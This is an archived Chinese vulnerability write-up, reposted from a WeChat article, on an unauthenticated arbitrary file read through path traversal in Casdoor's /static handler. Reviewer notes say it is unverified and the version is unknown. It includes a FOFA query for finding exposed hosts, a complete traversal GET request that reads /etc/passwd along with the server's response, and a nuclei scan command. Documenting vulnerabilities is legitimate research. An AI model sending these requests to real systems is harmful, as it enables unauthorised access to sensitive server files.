---
fofa: ""
source: "MrWQ/vulnerability-paper"
product: "Casdoor static traversal"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "搜索语句"
title: "0day Casdoor 任意文件读取漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Explicitly unknown; response October8,2023; platform/static-handler prerequisites unstated"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/ewd7rttOKxNDFEmFNRNaeA"
id: "vw-d7ae410844b5dfe7fda6d032"
entity_id: "ve-d7ae410844b5dfe7fda6d032"
schema_version: "1"
---

## 核对与使用边界


- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Explicitly unknown; response October8,2023; platform/static-handler prerequisites unstated

代码与实验材料：Full unauthenticated GET and passwd-like response; nuclei file gated by social reply and absent

来源证据范围：Original WeChat URL; no vendor advisory/patch

- **结论使用边界（1）**：Metadata extraction replaced usable query with heading；依据：fofa: 搜索语句 versus body title=Casdoor。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：Generic remediation does not prevent traversal and confuses read primitive with command execution；依据：绝对路径...将防止; open/read/write替代system/exec。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（3）**：No version/build or primary confirmation; remove current0day implication。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 【0day】Casdoor 任意文件读取漏洞

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ewd7rttOKxNDFEmFNRNaeA)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

Casdoor 系统 static 任意文件读取漏洞  

02

—  

漏洞影响

版本信息不详

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfiaBttws98o9evb7fvnr8PFK0SlbAzwSKktibJYGajodA46123x3Ewd99g/640?wx_fmt=png)

03

—  

漏洞描述

Casdoor 是一个基于 OAuth 2.0、OIDC、SAML 和 CAS 的，UI-first 的身份和访问管理 (IAM)/ 单点登录(SSO) 平台。使用 Go 和 react 开发，前后端分离，内置第三方应用登录服务。Casdoor 有四个核心概念，分别是 组织 (Organization)，用户 (User)，应用 (Application) 和 提供商 (Provider)。组织承载用户和应用，一个用户只能隶属于一个组织，但可以登录到自己组织的多个应用中；而提供商则代表了某种身份验证方式，例如电子邮件验证、短信验证、OAuth 验证等。

Casdoor 系统 static 存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的敏感文件。

04

—  

资产 FOFA 搜索语句

  

```
title="Casdoor"

```

05

—  

漏洞复现

向目标发送如下请求

```
GET /static/../../../../../../../../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx:9999
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip

```

收到如下响应数据包  

```
HTTP/1.1 200 OK
Connection: close
Accept-Ranges: bytes
Content-Type: text/plain; charset=utf-8
Date: Sun, 08 Oct 2023 03:59:53 GMT
Last-Modified: Mon, 21 Aug 2023 06:20:56 GMT
Set-Cookie: casdoor_session_id=e242bf06ee7f075f4dd6f206ebb7c95e; Path=/; Expires=Tue, 07 Nov 2023 03:59:53 GMT; Max-Age=2592000; HttpOnly
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin

```

证明漏洞存在

06

—  

nuclei poc

nuclei poc 已上传网盘，后台回复【0006】免费获取

单个目标扫描

```
 .\nuclei.exe -t .\casdoor-file-read.yaml -u http://x.x.x.x:9999 -me ttt

```

运行结果如下

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfiaeWZMuG466yTtcmPDmDcDIEzb3b2EiaA3MHEFf7RibOh5otoe2oyhicYcQ/640?wx_fmt=png)

上述命令中的 - me 表示输出 markdown 文件，方便查看数据包

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNPCeZtAv4mGpUicRiap4ZOfiatvRDvMThCFIar3P2PD4Zia2XRekgcXR9UvWM32xDxcficFjFWxicSEjNw/640?wx_fmt=png)

07

—  

修复建议

1.  输入验证和过滤：
    

*   对于用户提供的文件路径或文件名，进行输入验证和过滤。只允许合法和预期的输入。
    
*   使用白名单来限制可访问的文件和目录，而不是黑名单。黑名单容易受到绕过攻击。
    

3.  文件路径的绝对化：
    

*   使用绝对路径而不是相对路径来引用文件。这将防止攻击者使用相对路径来访问系统文件。
    

5.  权限管理：
    

*   仔细管理文件和目录的权限。确保只有授权的用户和进程可以访问敏感文件。
    
*   最小化文件系统权限，使非必要的文件对所有用户都不可访问。
    

7.  沙盒化：
    

*   在应用程序中实施沙盒化，以隔离文件系统操作，限制对敏感文件和目录的访问。
    

9.  使用安全的文件访问函数：
    

*   使用安全的文件访问函数，如 `open` 和 `read`, `write` 等，而不是使用不安全的函数，如 `system` 或 `exec`。
    

08

—  

关注我们

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
